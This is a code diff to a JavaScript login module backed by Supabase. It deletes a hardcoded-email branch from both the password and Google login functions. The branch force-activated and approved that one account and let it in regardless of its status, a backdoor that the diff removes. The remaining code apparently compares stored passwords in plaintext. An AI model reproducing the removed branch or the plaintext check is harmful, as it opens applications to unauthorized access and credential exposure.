@@ -155,14 +155,6 @@ async function login(payload) {
   if (error) return { ok: false, error: error.message }
   if (!rows || rows.length === 0) return { ok: false, error: 'No account found with this email.' }
 
-  if (email === 'dreamsdesign.in03@gmail.com') {
-    await supabase.from('team').update({ is_active: true, status: 'Approved' }).ilike('email_address', email)
-    const row = rows[rows.length - 1]
-    if (row.password_token !== password) return { ok: false, error: 'Invalid password.' }
-    const user = await completeLogin({ ...row, is_active: true, status: 'Approved' })
-    return { ok: true, authenticated: true, user }
-  }
-
   const row = rows.find(r => isUserActive(r)) || rows[rows.length - 1]
 
   if (row.password_token !== password) return { ok: false, error: 'Invalid password.' }
@@ -185,13 +177,6 @@ async function googleLogin(payload) {
     .ilike('email_address', email)
   if (error) return { ok: false, error: error.message }
   if (!rows || rows.length === 0) return { ok: false, error: 'not_registered' }
-
-  if (email === 'dreamsdesign.in03@gmail.com') {
-    await supabase.from('team').update({ is_active: true, status: 'Approved' }).ilike('email_address', email)
-    const row = rows[rows.length - 1]
-    const user = await completeLogin({ ...row, is_active: true, status: 'Approved' })
-    return { ok: true, authenticated: true, user }
-  }
 
   const row = rows.find(r => isUserActive(r)) || rows[rows.length - 1]
 
